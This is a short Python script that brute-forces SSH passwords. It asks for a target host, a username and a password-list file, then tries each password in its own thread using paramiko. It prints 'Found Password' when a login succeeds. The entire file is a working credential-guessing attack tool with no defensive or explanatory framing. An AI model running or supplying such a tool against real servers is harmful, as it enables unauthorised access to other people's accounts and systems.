import paramiko, sys, os, socket, termcolor
import threading, time

stop_flag = 0

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
path_passwords_file = input('[+] Passwords File: ')


def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
    except:
        print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))

    ssh.close()


if not os.path.exists(path_passwords_file):
    print(f'{path_passwords_file} does not exist')
    sys.exit(1)

with open(path_passwords_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.1)
